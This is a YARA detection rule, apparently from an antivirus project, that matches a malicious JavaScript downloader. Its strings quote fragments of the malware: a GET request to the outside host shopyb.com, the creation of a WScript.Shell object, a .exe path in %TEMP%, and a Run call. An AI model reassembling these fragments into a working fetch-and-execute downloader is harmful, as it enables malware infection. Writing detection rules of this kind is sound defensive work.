rule sig_20160330_3e0a5be6ff042329c364ac332370da56 {
  meta:
    description = "datamaliciousorder - file 20160330_3e0a5be6ff042329c364ac332370da56.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "94e6223e59e21b72521ed700310f15c5576c9cf41295b642a1a92b46b576bb3d"

  strings:
    $s1  = "_OT[_ZJ](\"GET\", \"http://shopyb.com/s6dlas\", false);" fullword ascii
    $s2  = "var _GK = function _TD() {return WScript[_P](\"WScript\"+\".Shell\");}(), _S0 = 11;" fullword ascii
    $s3  = "function _BK(_B, _PD){_Q = _Q * 1; return _B - _PD;};" fullword ascii
    $s4  = "if (_OT[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _VK() {return _GK[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"dfQpfEPwp.ex\" + \"e\";};" fullword ascii
    $s6  = "function _G(){return _J + \"\";};" fullword ascii
    $s7  = "function _E() {return ((_FX == true) && (_FX == _I0)) ? 1 : _Q;};" fullword ascii
    $s8  = "function _V(_T1){_GK[\"Run\"](_T1, _Q, _Q);};" fullword ascii
    $s9  = "function _R()" fullword ascii
    $s10 = "function _AL(){return 22;};" fullword ascii
    $s11 = "var _U = new this[\"Date\"]();" fullword ascii
    $s12 = "function _QO(_T) {var _D = (1, 2, 3, 4, 5, _T); return _D;};" fullword ascii
    $s13 = " while (_C){" fullword ascii
    $s14 = "return _BK(_ES, _S);" fullword ascii
    $s15 = "function _BC(){return _P;};" fullword ascii
    $s16 = "_I0 = true; " fullword ascii
    $s17 = "_FX = true; " fullword ascii
    $s18 = "var _I0 = false;" fullword ascii
    $s19 = "var _DB = false;" fullword ascii
    $s20 = "var _FX = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}